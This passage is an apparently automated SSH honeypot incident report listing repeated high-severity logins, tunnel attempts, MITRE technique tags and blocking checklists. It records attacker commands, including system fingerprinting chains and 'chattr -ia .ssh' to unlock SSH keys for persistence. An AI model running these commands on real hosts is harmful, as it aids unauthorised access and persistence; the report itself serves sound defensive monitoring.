| `2026-08-15 01:31:14` | `cowrie.login.success` |
| `2026-08-15 01:31:15` | `cowrie.direct-tcpip.request` |
| `2026-08-15 01:31:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.115.144[.]103` to AbuseIPDB if not already reported
- [ ] Block `187.115.144[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7554cb64fcbc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 01:32 |
| **Last Seen** | 2026-08-15 01:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:32:22` | `cowrie.session.connect` |
| `2026-08-15 01:32:22` | `cowrie.client.version` |
| `2026-08-15 01:32:22` | `cowrie.client.kex` |
| `2026-08-15 01:32:24` | `cowrie.login.success` |
| `2026-08-15 01:32:25` | `cowrie.session.params` |
| `2026-08-15 01:32:25` | `cowrie.command.input` |
| `2026-08-15 01:32:25` | `cowrie.command.input` |
| `2026-08-15 01:32:25` | `cowrie.command.input` |
| `2026-08-15 01:32:25` | `cowrie.command.input` |
| `2026-08-15 01:32:25` | `cowrie.command.input` |
| `2026-08-15 01:32:25` | `cowrie.command.success` |
| `2026-08-15 01:32:25` | `cowrie.command.input` |
| `2026-08-15 01:32:25` | `cowrie.command.input` |
| `2026-08-15 01:32:25` | `cowrie.command.input` |
| `2026-08-15 01:32:25` | `cowrie.command.input` |
| `2026-08-15 01:32:25` | `cowrie.log.closed` |
| `2026-08-15 01:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4d29fdbe224

| Field | Detail |
|---|---|
| **Source IP** | `169.58.161[.]169` |
| **First Seen** | 2026-08-15 01:33 |
| **Last Seen** | 2026-08-15 01:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:33:51` | `cowrie.session.connect` |
| `2026-08-15 01:33:51` | `cowrie.client.version` |
| `2026-08-15 01:33:51` | `cowrie.client.kex` |
| `2026-08-15 01:33:52` | `cowrie.login.success` |
| `2026-08-15 01:33:54` | `cowrie.session.params` |
| `2026-08-15 01:33:54` | `cowrie.command.input` |
| `2026-08-15 01:33:54` | `cowrie.log.closed` |
| `2026-08-15 01:33:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.58.161[.]169` to AbuseIPDB if not already reported
- [ ] Block `169.58.161[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-304f667db927

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 01:34 |
| **Last Seen** | 2026-08-15 01:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:34:25` | `cowrie.session.connect` |
| `2026-08-15 01:34:25` | `cowrie.client.version` |
| `2026-08-15 01:34:25` | `cowrie.client.kex` |
| `2026-08-15 01:34:26` | `cowrie.login.success` |
| `2026-08-15 01:34:27` | `cowrie.session.params` |
| `2026-08-15 01:34:27` | `cowrie.command.input` |
| `2026-08-15 01:34:27` | `cowrie.command.input` |
| `2026-08-15 01:34:27` | `cowrie.command.input` |
| `2026-08-15 01:34:27` | `cowrie.command.input` |
| `2026-08-15 01:34:27` | `cowrie.command.input` |
| `2026-08-15 01:34:27` | `cowrie.command.success` |
| `2026-08-15 01:34:27` | `cowrie.command.input` |
| `2026-08-15 01:34:27` | `cowrie.command.input` |
| `2026-08-15 01:34:27` | `cowrie.command.input` |
| `2026-08-15 01:34:27` | `cowrie.command.input` |
| `2026-08-15 01:34:27` | `cowrie.log.closed` |
| `2026-08-15 01:34:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bd3b27971a9

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]135` |
| **First Seen** | 2026-08-15 01:35 |
| **Last Seen** | 2026-08-15 01:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:35:18` | `cowrie.session.connect` |
| `2026-08-15 01:35:19` | `cowrie.client.version` |
| `2026-08-15 01:35:19` | `cowrie.client.kex` |
| `2026-08-15 01:35:20` | `cowrie.login.success` |
| `2026-08-15 01:35:21` | `cowrie.direct-tcpip.request` |
| `2026-08-15 01:35:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]135` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]135` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3929d3c63822

| Field | Detail |
|---|---|
| **Source IP** | `124.239.169[.]52` |
| **First Seen** | 2026-08-15 01:35 |
| **Last Seen** | 2026-08-15 01:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:35:26` | `cowrie.session.connect` |
| `2026-08-15 01:35:27` | `cowrie.client.version` |
| `2026-08-15 01:35:27` | `cowrie.client.kex` |
| `2026-08-15 01:35:29` | `cowrie.login.success` |
| `2026-08-15 01:35:30` | `cowrie.direct-tcpip.request` |
| `2026-08-15 01:35:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.239.169[.]52` to AbuseIPDB if not already reported
- [ ] Block `124.239.169[.]52` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-342eed94ea29

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 01:36 |
| **Last Seen** | 2026-08-15 01:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:36:25` | `cowrie.session.connect` |
| `2026-08-15 01:36:25` | `cowrie.client.version` |
| `2026-08-15 01:36:25` | `cowrie.client.kex` |
| `2026-08-15 01:36:27` | `cowrie.login.success` |
| `2026-08-15 01:36:28` | `cowrie.session.params` |
| `2026-08-15 01:36:28` | `cowrie.command.input` |
| `2026-08-15 01:36:28` | `cowrie.command.input` |
| `2026-08-15 01:36:28` | `cowrie.command.input` |
| `2026-08-15 01:36:28` | `cowrie.command.input` |
| `2026-08-15 01:36:28` | `cowrie.command.input` |
| `2026-08-15 01:36:28` | `cowrie.command.success` |
| `2026-08-15 01:36:28` | `cowrie.command.input` |
| `2026-08-15 01:36:28` | `cowrie.command.input` |
| `2026-08-15 01:36:28` | `cowrie.command.input` |
| `2026-08-15 01:36:28` | `cowrie.command.input` |
| `2026-08-15 01:36:28` | `cowrie.log.closed` |
| `2026-08-15 01:36:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cf2d0fd422b

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]59` |
| **First Seen** | 2026-08-15 01:36 |
| **Last Seen** | 2026-08-15 01:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:36:52` | `cowrie.session.connect` |
| `2026-08-15 01:36:52` | `cowrie.client.version` |
| `2026-08-15 01:36:52` | `cowrie.client.kex` |
| `2026-08-15 01:36:54` | `cowrie.login.success` |
| `2026-08-15 01:36:54` | `cowrie.direct-tcpip.request` |
| `2026-08-15 01:36:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]59` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c06b47051cc

| Field | Detail |
|---|---|
| **Source IP** | `27.223.98[.]117` |
| **First Seen** | 2026-08-15 01:36 |
| **Last Seen** | 2026-08-15 01:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:36:59` | `cowrie.session.connect` |
| `2026-08-15 01:37:00` | `cowrie.client.version` |
| `2026-08-15 01:37:00` | `cowrie.client.kex` |
| `2026-08-15 01:37:02` | `cowrie.login.success` |
| `2026-08-15 01:37:03` | `cowrie.direct-tcpip.request` |
| `2026-08-15 01:37:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.223.98[.]117` to AbuseIPDB if not already reported
- [ ] Block `27.223.98[.]117` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-452d180e4cc6

| Field | Detail |
|---|---|
| **Source IP** | `112.30.127[.]9` |
| **First Seen** | 2026-08-15 01:37 |
| **Last Seen** | 2026-08-15 01:37 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:37:04` | `cowrie.session.connect` |
| `2026-08-15 01:37:05` | `cowrie.client.version` |
| `2026-08-15 01:37:05` | `cowrie.client.kex` |
| `2026-08-15 01:37:09` | `cowrie.login.success` |
| `2026-08-15 01:37:10` | `cowrie.direct-tcpip.request` |
| `2026-08-15 01:37:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.30.127[.]9` to AbuseIPDB if not already reported
- [ ] Block `112.30.127[.]9` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-851016026930

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 01:37 |
| **Last Seen** | 2026-08-15 01:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:37:28` | `cowrie.session.connect` |
| `2026-08-15 01:37:28` | `cowrie.client.version` |
| `2026-08-15 01:37:28` | `cowrie.client.kex` |
| `2026-08-15 01:37:28` | `cowrie.login.success` |
| `2026-08-15 01:37:29` | `cowrie.session.params` |
| `2026-08-15 01:37:29` | `cowrie.command.input` |
| `2026-08-15 01:37:30` | `cowrie.log.closed` |
| `2026-08-15 01:37:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80ccc8716ce8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 01:38 |
| **Last Seen** | 2026-08-15 01:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:38:21` | `cowrie.session.connect` |
| `2026-08-15 01:38:21` | `cowrie.client.version` |
| `2026-08-15 01:38:21` | `cowrie.client.kex` |
| `2026-08-15 01:38:22` | `cowrie.login.success` |
| `2026-08-15 01:38:23` | `cowrie.session.params` |
| `2026-08-15 01:38:23` | `cowrie.command.input` |
| `2026-08-15 01:38:23` | `cowrie.command.input` |
| `2026-08-15 01:38:23` | `cowrie.command.input` |
| `2026-08-15 01:38:23` | `cowrie.command.input` |
| `2026-08-15 01:38:23` | `cowrie.command.input` |
| `2026-08-15 01:38:23` | `cowrie.command.success` |
| `2026-08-15 01:38:23` | `cowrie.command.input` |
| `2026-08-15 01:38:23` | `cowrie.command.input` |
| `2026-08-15 01:38:23` | `cowrie.command.input` |
| `2026-08-15 01:38:23` | `cowrie.command.input` |
| `2026-08-15 01:38:24` | `cowrie.log.closed` |
| `2026-08-15 01:38:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23d098b73613

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 01:38 |
| **Last Seen** | 2026-08-15 01:39 |
| **Session Duration** | 47s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:38:34` | `cowrie.session.connect` |
| `2026-08-15 01:38:41` | `cowrie.client.version` |
| `2026-08-15 01:38:41` | `cowrie.client.kex` |
| `2026-08-15 01:39:04` | `cowrie.login.success` |
| `2026-08-15 01:39:16` | `cowrie.session.params` |
| `2026-08-15 01:39:16` | `cowrie.command.input` |
| `2026-08-15 01:39:22` | `cowrie.log.closed` |
| `2026-08-15 01:39:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d33a75da2d4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 01:40 |
| **Last Seen** | 2026-08-15 01:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:40:15` | `cowrie.session.connect` |
| `2026-08-15 01:40:15` | `cowrie.client.version` |
| `2026-08-15 01:40:15` | `cowrie.client.kex` |
| `2026-08-15 01:40:17` | `cowrie.login.success` |
| `2026-08-15 01:40:18` | `cowrie.session.params` |
| `2026-08-15 01:40:18` | `cowrie.command.input` |
| `2026-08-15 01:40:18` | `cowrie.command.input` |
| `2026-08-15 01:40:18` | `cowrie.command.input` |
| `2026-08-15 01:40:18` | `cowrie.command.input` |
| `2026-08-15 01:40:18` | `cowrie.command.input` |
| `2026-08-15 01:40:18` | `cowrie.command.success` |
| `2026-08-15 01:40:18` | `cowrie.command.input` |
| `2026-08-15 01:40:18` | `cowrie.command.input` |
| `2026-08-15 01:40:18` | `cowrie.command.input` |
| `2026-08-15 01:40:18` | `cowrie.command.input` |
| `2026-08-15 01:40:18` | `cowrie.log.closed` |
| `2026-08-15 01:40:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35a40d1c097e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 01:42 |
| **Last Seen** | 2026-08-15 01:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:42:06` | `cowrie.session.connect` |
| `2026-08-15 01:42:07` | `cowrie.client.version` |
| `2026-08-15 01:42:07` | `cowrie.client.kex` |
| `2026-08-15 01:42:08` | `cowrie.login.success` |
| `2026-08-15 01:42:09` | `cowrie.session.params` |
| `2026-08-15 01:42:09` | `cowrie.command.input` |
| `2026-08-15 01:42:09` | `cowrie.command.input` |
| `2026-08-15 01:42:09` | `cowrie.command.input` |
| `2026-08-15 01:42:09` | `cowrie.command.input` |
| `2026-08-15 01:42:09` | `cowrie.command.input` |
| `2026-08-15 01:42:09` | `cowrie.command.success` |
| `2026-08-15 01:42:09` | `cowrie.command.input` |
| `2026-08-15 01:42:09` | `cowrie.command.input` |
| `2026-08-15 01:42:09` | `cowrie.command.input` |
| `2026-08-15 01:42:09` | `cowrie.command.input` |
| `2026-08-15 01:42:10` | `cowrie.log.closed` |
| `2026-08-15 01:42:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eee1807403d0

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]244` |
| **First Seen** | 2026-08-15 01:43 |
| **Last Seen** | 2026-08-15 01:48 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:43:26` | `cowrie.session.connect` |
| `2026-08-15 01:43:26` | `cowrie.client.version` |
| `2026-08-15 01:43:27` | `cowrie.client.kex` |
| `2026-08-15 01:43:28` | `cowrie.login.success` |
| `2026-08-15 01:43:30` | `cowrie.session.params` |
| `2026-08-15 01:43:30` | `cowrie.command.input` |
| `2026-08-15 01:43:30` | `cowrie.command.failed` |
| `2026-08-15 01:48:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]244` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0038691e328e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 01:43 |
| **Last Seen** | 2026-08-15 01:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:43:59` | `cowrie.session.connect` |
| `2026-08-15 01:43:59` | `cowrie.client.version` |
| `2026-08-15 01:43:59` | `cowrie.client.kex` |
| `2026-08-15 01:44:00` | `cowrie.login.success` |
| `2026-08-15 01:44:01` | `cowrie.session.params` |
| `2026-08-15 01:44:01` | `cowrie.command.input` |
| `2026-08-15 01:44:01` | `cowrie.command.input` |
| `2026-08-15 01:44:01` | `cowrie.command.input` |
| `2026-08-15 01:44:01` | `cowrie.command.input` |
| `2026-08-15 01:44:01` | `cowrie.command.input` |
| `2026-08-15 01:44:01` | `cowrie.command.success` |
| `2026-08-15 01:44:01` | `cowrie.command.input` |
| `2026-08-15 01:44:01` | `cowrie.command.input` |
| `2026-08-15 01:44:01` | `cowrie.command.input` |
| `2026-08-15 01:44:01` | `cowrie.command.input` |
| `2026-08-15 01:44:02` | `cowrie.log.closed` |
| `2026-08-15 01:44:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57cfbe9a1c01

| Field | Detail |
|---|---|
| **Source IP** | `65.20.187[.]47` |
| **First Seen** | 2026-08-15 01:45 |
| **Last Seen** | 2026-08-15 01:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:45:06` | `cowrie.session.connect` |
| `2026-08-15 01:45:07` | `cowrie.client.version` |
| `2026-08-15 01:45:07` | `cowrie.client.kex` |
| `2026-08-15 01:45:08` | `cowrie.login.success` |
| `2026-08-15 01:45:09` | `cowrie.direct-tcpip.request` |
| `2026-08-15 01:45:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.187[.]47` to AbuseIPDB if not already reported
- [ ] Block `65.20.187[.]47` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9a318940765

| Field | Detail |
|---|---|
| **Source IP** | `60.223.245[.]120` |
| **First Seen** | 2026-08-15 01:45 |
| **Last Seen** | 2026-08-15 01:45 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
